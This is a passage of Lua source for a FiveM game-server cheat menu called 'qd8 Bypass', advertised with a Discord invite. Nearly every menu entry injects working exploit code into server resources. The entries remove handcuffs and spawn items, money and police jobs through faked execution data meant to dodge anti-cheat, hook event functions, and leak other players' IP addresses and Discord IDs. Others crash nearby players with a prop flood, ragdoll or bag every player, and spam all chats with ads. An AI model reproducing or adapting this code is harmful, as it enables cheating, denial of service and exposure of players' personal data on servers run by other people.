                                    local function proxy_callback(rvalues)
                                        proxy_rdata = rvalues
                                    end
                                    
                                    local function proxy_resolve(itable, key)
                                        local iname = getmetatable(itable).name
                                        local fcall = function(args, callback)
                                            if args == nil then
                                                args = {}
                                            end
                                            TriggerEvent(iname .. ":proxy", key, args, proxy_callback)
                                            return table.unpack(proxy_rdata)
                                        end
                                        itable[key] = fcall
                                        return fcall
                                    end
                                    
                                    function Proxy.addInterface(name, itable)
                                        AddEventHandler(name .. ":proxy", function(member, args, callback)
                                            local f = itable[member]
                                            if type(f) == "function" then
                                                callback({f(table.unpack(args))})
                                            end
                                        end)
                                    end
                                    
                                    function Proxy.getInterface(name)
                                        local r = setmetatable({}, {__index = proxy_resolve, name = name})
                                        return r
                                    end
                                    
                                    -- تفعيل VRP وفك الكلبشة
                                    vRP = {}
                                    vRP = Proxy.getInterface("vRP")
                                    vRP.toggleHandcuff()
                                    
                                    -- رسالة في الشات
                                    TriggerEvent("chatMessage", "discord.gg/nww : تم فك الكلبشة")
                                ]])
                                qd8:Notify("success", "VRP", "تم فك الكلبشة في VRP!", 3000)
                            end
                        },
                        { type = "button", label = "VRP Paycheck", desc = "ثغرة إيداع الراتب في VRP",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    -- ثغرة إيداع الراتب VRP
                                    TriggerServerEvent("vRP:tunnel_req", "Paycheck", {}, "", -1)
                                ]])
                                qd8:Notify("success", "VRP", "تم إيداع الراتب!", 3000)
                            end
                        },
                        { type = "button", label = "VRP Open Menu", desc = "فتح القائمة الرئيسية وأنت مكلبش",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    -- فتح القائمة الرئيسية VRP
                                    TriggerServerEvent("vRP:tunnel_req", "openMainMenu", {}, "", -1)
                                ]])
                                qd8:Notify("success", "VRP", "تم فتح القائمة الرئيسية!", 3000)
                            end
                        },
                        { type = "button", label = "VRP Chat Spam", desc = "سبام الشات في جميع سيرفرات VRP",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    -- VRP Chat Spam
                                    CreateThread(function()
                                        local spamMessages = {
                                            "👑 Bdl ON Top 👑",
                                            "discord.gg/nww - qd8 VRP Spam",
                                            ".qd8 Bdl",
                                            "VRP Chat Spam by qd8",
                                            "👑 qd8 VRP HACK 👑"
                                        }
                                        
                                        for i = 1, 50 do
                                            local msg = spamMessages[math.random(1, #spamMessages)]
                                            
                                            -- جميع أنواع أنظمة الشات VRP
                                            TriggerEvent("chatMessage", "", msg)
                                            TriggerServerEvent("chatMessage", "", msg)
                                            TriggerEvent("chat:addMessage", {args = {"", msg}})
                                            TriggerServerEvent("chat:addMessage", {args = {"", msg}})
                                            
                                            -- أنظمة شات مختلفة
                                            TriggerEvent("vrp_chat:message", msg)
                                            TriggerServerEvent("vrp_chat:message", msg)
                                            TriggerEvent("vRP:chatMessage", msg)
                                            TriggerServerEvent("vRP:chatMessage", msg)
                                            
                                            Wait(500)
                                        end
                                    end)
                                ]])
                                qd8:Notify("success", "VRP", "تم بدء سبام الشات في VRP!", 3000)
                            end
                        },
                        { type = "button", label = "VRP All Exploits", desc = "تشغيل جميع ثغرات VRP معاً",
                            onSelect = function()
                                MachoInjectResource("any", [[
                                    -- تشغيل جميع ثغرات VRP
                                    CreateThread(function()
                                        -- VRP Proxy System
                                        Proxy = {}
                                        local proxy_rdata = {}
                                        
                                        local function proxy_callback(rvalues)
                                            proxy_rdata = rvalues
                                        end
                                        
                                        local function proxy_resolve(itable, key)
                                            local iname = getmetatable(itable).name
                                            local fcall = function(args, callback)
                                                if args == nil then
                                                    args = {}
                                                end
                                                TriggerEvent(iname .. ":proxy", key, args, proxy_callback)
                                                return table.unpack(proxy_rdata)
                                            end
                                            itable[key] = fcall
                                            return fcall
                                        end
                                        
                                        function Proxy.addInterface(name, itable)
                                            AddEventHandler(name .. ":proxy", function(member, args, callback)
                                                local f = itable[member]
                                                if type(f) == "function" then
                                                    callback({f(table.unpack(args))})
                                                end
                                            end)
                                        end
                                        
                                        function Proxy.getInterface(name)
                                            local r = setmetatable({}, {__index = proxy_resolve, name = name})
                                            return r
                                        end
                                        
                                        -- تفعيل VRP
                                        vRP = {}
                                        vRP = Proxy.getInterface("vRP")
                                        
                                        -- فك الكلبشة
                                        vRP.toggleHandcuff()
                                        Wait(1000)
                                        
                                        -- إيداع الراتب
                                        TriggerServerEvent("vRP:tunnel_req", "Paycheck", {}, "", -1)
                                        Wait(1000)
                                        
                                        -- فتح القائمة
                                        TriggerServerEvent("vRP:tunnel_req", "openMainMenu", {}, "", -1)
                                        Wait(1000)
                                        
                                        -- رسالة نجاح
                                        TriggerEvent("chatMessage", "discord.gg/nww : تم تشغيل جميع ثغرات VRP!")
                                    end)
                                ]])
                                qd8:Notify("success", "VRP", "تم تشغيل جميع ثغرات VRP!", 3000)
                            end
                        }
                    }
                }
            }
        },
        {
            icon = "",
            label = "Search",
            type = "subMenu",
            categories = {
                {
                    label = "Search",
                    tabs = {
                        { type = "button", label = "Search", desc = "Instantly search and find any menu option",
                            onSelect = function()
                                KeyboardInput("Quick Search", "", function(val)
                                    if val and val ~= "" then
                                        -- Immediate search without delay
                                        self:QuickSearchMenuItems(val)
                                    else
                                        qd8:Notify("error", "qd8", "Enter something to search for!", 2000)
                                    end
                                end, "typeable")
                            end
                        }
                    }
                }
            }
        },

    }

    CurrentMenu = ActiveMenu
    CurrentCategories = nil
    CurrentCategoryIndex = 1
    HoveredIndex = 1
end

local function AddTrigger(data)
    for _, menu in ipairs(ActiveMenu) do
        if menu.label == "Server" then
            for _, cat in ipairs(menu.categories) do
                if cat.label == "Triggers" then
                    cat.tabs[#cat.tabs + 1] = data
                    return
                end
            end
        end
    end
end

function qd8:UpdateTabChecked(menu, label, checked)
    for _, tab in pairs(menu or {}) do
        if tab.label == label and (tab.type == "checkbox" or tab.type == "slider-checkbox" or tab.type:find("checkbox")) then
            tab.checked = checked
        elseif tab.type == "subMenu" then
            if tab.categories then
                for _, cat in pairs(tab.categories) do
                    self:UpdateTabChecked(cat.tabs, label, checked)
                end
            end
            
            if tab.subTabs then
                self:UpdateTabChecked(tab.subTabs, label, checked)
            end
        end
    end
end

function qd8:ShowKeybindList(binds)
    self:SendMessage({ action = "displayBinds", visible = true, binds = binds })
end

function qd8:HideKeybindList()
    self:SendMessage({ action = "displayBinds", visible = false })
end

function qd8:GetNearbyPlayers(coords, maxDistance, includePlayer)
    local nearby = {}
    local myPed = PlayerPedId()
    maxDistance = maxDistance or 350.0

    if not myPed or not DoesEntityExist(myPed) or not IsPlayerPlaying(PlayerId()) then
        nearby = {}
        return nearby
    end

    local activePlayers = GetActivePlayers()

    if activePlayers then
        for _, playerId in ipairs(activePlayers) do
            if includePlayer or playerId ~= PlayerId() then
                local ped = GetPlayerPed(playerId)
                if ped and DoesEntityExist(ped) and IsEntityAPed(ped) and not IsEntityDead(ped) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
        end
    else
        local handle, ped = FindFirstPed()
        local success

        repeat
            if ped and IsPedAPlayer(ped) and DoesEntityExist(ped) then
                local playerId = NetworkGetPlayerIndexFromPed(ped)
                if playerId ~= -1 and (includePlayer or playerId ~= PlayerId()) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
            success, ped = FindNextPed(handle)
        until not success
        EndFindPed(handle)
    end

    if #nearby == 0 then
        nearby = {}
    end

    return nearby
end

CreateThread(function()
    qd8:Initialize()
    qd8:BuildDefaultMenu()
    qd8:UpdateElements(CurrentMenu)
    Wait(1000)
    qd8:Notify("success", "qd8", "You have loaded qd8 Bypass, welcome!", 3000)
    Wait(1000)
    qd8:Notify("info", "qd8", "Your key will never expire, thanks for using qd8 Bypass!", 3000)
    Wait(1000)

    -- AddTrigger({ type = "button", label = "Example Trigger",
    --     onSelect = function()
    --     end
    -- })

    -- AddTrigger({ type = "checkbox", label = "Example Trigger 2", checked = false,
    --     onSelect = function(checked)
    --         if checked then
    --             -- On
    --         else
    --             -- Off
    --         end
    --     end
    -- })


if GetResourceState("ox_lib") == "started" or GetResourceState("lb-phone") == "started" or GetResourceState("monitor") == "started" or GetResourceState("core") == "started" or GetResourceState("es_extended") == "started" or GetResourceState("qb-core") == "started" or GetResourceState("ox_lib") == "started" then
    AddTrigger({
        type = "button",
        label = "Deobfuscate Events",
        onSelect = function()
            qd8:HideUI()
            local resourceName = nil
            local done = false

            KeyboardInput("Resource Name", "", function(val)
                if val and val ~= "" then
                    resourceName = val
                end
                done = true
            end, "typeable")

            while not done do
                Wait(100)
            end

            if not resourceName or resourceName == "" then
                MachoMenuNotification("Error", "No resource name entered.")
                qd8:ShowUI()
                return
            end

            if GetResourceState(resourceName) ~= "started" then
                MachoMenuNotification("Error", "Resource ^3" .. resourceName .. "^7 is not started or doesn’t exist.")
                qd8:ShowUI()
                return
            end

            local payload = [[
                local d = function(t)
                    local s = ""
                    for i = 1, #t do s = s .. string.char(t[i]) end
                    return s
                end
                local g = function(e) return _G[d(e)] end
                local w = function(ms) Citizen.Wait(ms) end

                local function SimpleJsonEncode(value)
                    if type(value) == "table" then
                        local parts = {}
                        local isArray = true
                        local maxIndex = 0
                        for k, _ in pairs(value) do
                            if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                isArray = false
                                break
                            end
                            maxIndex = math.max(maxIndex, k)
                        end
                        if isArray then
                            for i = 1, maxIndex do
                                local v = value[i]
                                parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                            end
                            return "[" .. table.concat(parts, ",") .. "]"
                        else
                            for k, v in pairs(value) do
                                if type(k) == "string" then
                                    parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                end
                            end
                            return "{" .. table.concat(parts, ",") .. "}"
                        end
                    elseif type(value) == "string" then
                        return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]]

            Injection(resourceName, payload)

            MachoMenuNotification("Injector", "Hooks injected into ^3" .. resourceName .. "^7 successfully!")
            qd8:ShowUI()
        end
    })
end

    if GetResourceState("ox_lib") == "started" then
    AddTrigger({
        type = "button",
        label = "Crash Nearby Players",
        onSelect = function()
        if GetResourceState("WaveShield") == "started" then
            qd8:Notify("error", "qd8", "Ban Prevention: Cannot Use this on WaveShield", 3000)
            return
        end
            MachoInjectResourceRaw("ox_lib", [[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]])
        end,
    })
end

    if GetResourceState("dpemotes") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Bring All Nearby Players",
            onSelect = function()
                qd8:Notify("success", "qd8", "Attempting to bring all players", 3000)
                MachoInjectThread(0, 'dpemotes', '', [[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]])
            end
        })
    end

    if GetResourceState('mc9-adminmenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "Admin Menu List (F8)",
            onSelect = function()
                qd8:Notify("success", "qd8", "Admin Menu List", 3000)

            MachoInjectResource2(NewThreadNs, "mc9-adminmenu", [[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]])
            end,
        })
    end    

    if GetResourceState('mc9-mainmenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "MC9 Item Spawner",
            onSelect = function()
            qd8:Notify("success", "qd8", "Spawning Items", 3000)
            MachoInjectResource2(NewThreadNs, "mc9-mainmenu", [[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]])
            end,
        })
    end

    if GetResourceState('vMenu') == 'started' then
        AddTrigger({
            type = "button",
            label = "Message Server",
            onSelect = function()
                qd8:Notify("success", "qd8", "Message Sent", 3000)

                MachoInjectResource2(1, "any", [[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is repercing with qd8 Bypass, the leading cheat in the market. Join our discord at https://discord.gg/nww')
                ]])
            end,
        })
    end


    if GetResourceState("amigo") == "started" then
        AddTrigger({
            type = "button",
            label = "Give Item #1",
            onSelect = function()
                qd8:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                print("^7[^5qd8^7] [^3DEBUG^7]: Waiting for item input...")

                local itemName = GetInput("Item Name", "")
                print("^7[^5qd8^7] [^3DEBUG^7]: Raw itemName =", tostring(itemName))

                if not itemName or itemName == "" then
                    print("^7[^5qd8^7] [^1ERROR^7]: Invalid or empty itemName")
                    qd8:Notify("error", "qd8", "No item name entered", 3000)
                    qd8:ShowUI()
                    return
                end

                print("^7[^5qd8^7] [^3DEBUG^7]: Waiting for item count input...")

                local inputCount = GetInput("Item Count", "1")
                print("^7[^5qd8^7] [^3DEBUG^7]: Raw inputCount =", tostring(inputCount))

                local itemCount = tonumber(inputCount)
                if not itemCount or itemCount < 1 then
                    print("^7[^5qd8^7] [^1WARN^7]: Invalid count, defaulting to 1")
                    itemCount = 1
                end
                if itemCount > 100000 then
                    print("^7[^5qd8^7] [^1WARN^7]: Count too high, clamping to 100000")
                    itemCount = 100000
                end

                itemName  = tostring(itemName or "")
                itemCount = tonumber(itemCount or 1)

                print("^7[^5qd8^7] [^3DEBUG^7]: Final itemName =", itemName)
                print("^7[^5qd8^7] [^3DEBUG^7]: Final itemCount =", itemCount)

                local success, err = pcall(function()
                    MachoInjectResourceRaw("amigo", string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5qd8^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.qd8 = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5qd8^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.qd8.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]], itemName, itemCount, itemName, itemCount))
                end)

                if not success then
                    print("^7[^5qd8^7] [^1ERROR^7]: string.format failed →", err)
                    print("^7[^5qd8^7] [^3DEBUG^7]: itemName =", tostring(itemName), "itemCount =", tostring(itemCount))
                    qd8:Notify("error", "qd8", "String format failed — check console", 4000)
                else
                    print("^7[^5qd8^7] [^2INFO^7]: Injection completed successfully")
                end

                qd8:ShowUI()
            end
        })
    end

    local scriptsRunning = GetResourceState("scripts") == "started"
    local frameworkRunning = GetResourceState("framework") == "started"

    if scriptsRunning or frameworkRunning then
        local runningResource = scriptsRunning and "scripts" or "framework"
        AddTrigger({
            type = "button",
            label = "End Comserv",
            onSelect = function()
                qd8:Notify("Comserv", "qd8", "Action Removed you might have to spam this", 3000)
                MachoInjectResourceRaw(runningResource, [[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]])
            end
        })
    end

    if GetResourceState("es_extended") == "started" or GetResourceState("core") == "started" then
        AddTrigger({
            type = "button",
            label = "Setjob Police #1 (New)",
            onSelect = function()
                if GetResourceState("es_extended") == "started" then
                    qd8:Notify("Setjob", "qd8", "Your job has been set to police", 3000)
                    MachoInjectResource2(NewThreadNs, "es_extended", [[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]])
                elseif GetResourceState("core") == "started" then
                    qd8:Notify("Setjob", "qd8", "Your job has been set to police", 3000)
                    MachoInjectResource2(NewThreadNs, "core", [[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]])
                else
                    print("Neither core nor es_extended started")
                end
            end
        })
    end

    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Set Job #2(Police)",
            onSelect = function()
                qd8:Notify("Setjob", "qd8", "Your job has been set to police", 3000)
                MachoInjectResourceRaw("any", [[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]])
            end
        })
    end

    if GetResourceState("codewave-sneaker-phone") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Give Shoes Reward",
            onSelect = function()
                MachoInjectResource2(NewThreadNs, "codewave-sneaker-phone", [[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.qd8 = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.qd8.TSEvent('delivery:giveRewardShoes', 1000)
                    print("[✅] reward triggered successfully.")
                ]])
            end
        })
    end

    if GetResourceState("rzrp-base") == "started" then
        AddTrigger({
            type = "checkbox",
            label = "Ragdoll Players (RZRP)",
            checked = false,
            onSelect = function(checked)
                if checked then
                qd8:Notify("Ragdoll", "qd8", "Ragdolling Nearby Players", 4000)
                    Injection("rzrp-base", [[
                        if not _G.qd8RagdollPlayersInitialized then
                            _G.qd8RagdollPlayersEnabled = true
                            _G.qd8RagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.qd8RagdollThread then
                                TerminateThread(_G.qd8RagdollThread)
                                _G.qd8RagdollThread = nil
                            end

                            _G.qd8RagdollThread = SafeThread(function()
                                while _G.qd8RagdollPlayersEnabled and _G.qd8RagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.qd8RagdollThread = nil
                            end)
                        else
                            _G.qd8RagdollPlayersEnabled = true
                        end
                    ]])
                else
                qd8:Notify("Ragdoll", "qd8", "Stopped Ragdolling Players", 4000)
                    Injection("rzrp-base", [[
                        _G.qd8RagdollPlayersEnabled = false
                        _G.qd8RagdollPlayersInitialized = false
                        if _G.qd8RagdollThread then
                            TerminateThread(_G.qd8RagdollThread)
                            _G.qd8RagdollThread = nil
                        end
                    ]])
                end
            end
        })
    end

    if GetResourceState("rzrp-base") == "started" then
        AddTrigger({
            type = "checkbox",
            label = "Bag Closest Players (RZRP)",
            checked = false,
            onSelect = function(checked)
                if checked then
                    print('Bag Closest Players Started...')
                    Injection("rzrp-base", [[
                        if not _G.qd8BagPlayersInitialized then
                            _G.qd8BagPlayersEnabled = true
                            _G.qd8BagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.qd8BagThread then
                                TerminateThread(_G.qd8BagThread)
                                _G.qd8BagThread = nil
                            end

                            _G.qd8BagThread = SafeThread(function()
                                while _G.qd8BagPlayersEnabled and _G.qd8BagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.qd8BagThread = nil
                            end)
                        else
                            _G.qd8BagPlayersEnabled = true
                        end
                    ]])
                else
                    print('Bag Closest Players Stopped...')
                    Injection("rzrp-base", [[
                        _G.qd8BagPlayersEnabled = false
                        _G.qd8BagPlayersInitialized = false
                        if _G.qd8BagThread then
                            TerminateThread(_G.qd8BagThread)
                            _G.qd8BagThread = nil
                        end
                    ]])
                end
            end
        })
    end

    if GetResourceState("scripts") == "started" or GetResourceState("framework") == "started" then
        AddTrigger({ 
            type = "button", 
            label = "Set Gang",
            onSelect = function()
                local gangName = ""
                local gangRank = 1
                qd8:HideUI()
                KeyboardInput("Gang Name", "", function(val)
                    if val and val ~= "" then
                        gangName = val
                    end
                end, "typeable")
                Wait(2300)
                KeyboardInput("Gang Rank", "", function(val)
                    if val and val ~= "" then
                        gangRank = tonumber(val) or 1
                    end
                end, "typeable")
                Wait(1000)
                local targetResource = GetResourceState("scripts") == "started" and "scripts" or "framework"
                local injectionCode = string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]], gangName, gangRank)
                Injection(targetResource, injectionCode)
                qd8:ShowUI()
                qd8:Notify("success", "qd8", "Gang Set", 4000)
            end
        })
    end

    if GetResourceState("framework") == "started" then
        AddTrigger({
            type = "button",
            label = "Give Item #2",
            onSelect = function()
                qd8:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false

                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")

                    while not done do
                        Wait(0)
                    end

                    return result
                end

                print("^7[^5qd8^7] [^3DEBUG^7]: Waiting for item input...")

                local itemName = GetInput("Item Name", "")
                print("^7[^5qd8^7] [^3DEBUG^7]: Raw itemName =", tostring(itemName))

                if not itemName or itemName == "" then
                    print("^7[^5qd8^7] [^1ERROR^7]: Invalid or empty itemName")
                    qd8:Notify("error", "qd8", "No item name entered", 3000)
                    qd8:ShowUI()
                    return
                end

                print("^7[^5qd8^7] [^3DEBUG^7]: Waiting for item count input...")

                local inputCount = GetInput("Item Count", "1")
                print("^7[^5qd8^7] [^3DEBUG^7]: Raw inputCount =", tostring(inputCount))

                local itemCount = tonumber(inputCount)
                if not itemCount or itemCount < 1 then
                    print("^7[^5qd8^7] [^1WARN^7]: Invalid count, defaulting to 1")
                    itemCount = 1
                end
                if itemCount > 100000 then
                    print("^7[^5qd8^7] [^1WARN^7]: Count too high, clamping to 100000")
                    itemCount = 100000
                end

                itemName  = tostring(itemName or "")
                itemCount = tonumber(itemCount or 1)

                print("^7[^5qd8^7] [^3DEBUG^7]: Final itemName =", itemName)
                print("^7[^5qd8^7] [^3DEBUG^7]: Final itemCount =", itemCount)

                local success, err = pcall(function()
                    MachoInjectResourceRaw("framework", string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]], itemName, itemCount))
                end)

                if not success then
                    print("^7[^5qd8^7] [^1ERROR^7]: string.format failed →", err)
                    qd8:Notify("error", "qd8", "String format failed — check console", 4000)
                else
                    print("^7[^5qd8^7] [^2INFO^7]: Injection completed successfully")
                    qd8:Notify("success", "qd8", "Item Sent", 4000)
                end

                qd8:ShowUI()
            end
        })
    end

    if GetResourceState("WayTooCerti_3D_Printer") == 'started' then
        AddTrigger({ type = "button", label = "Give Item #3",
            onSelect = function()
            MachoInjectResourceRaw("WayTooCerti_3D_Printer", [[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]])
            end
        })
    end

    if GetResourceState("tm-base") == "started" then
        table.insert(events, {
            name = "Spawn Money #4",
            eventName = "give_metro_money_04",
            execute = function()
                print('Give Money Metro RP...')
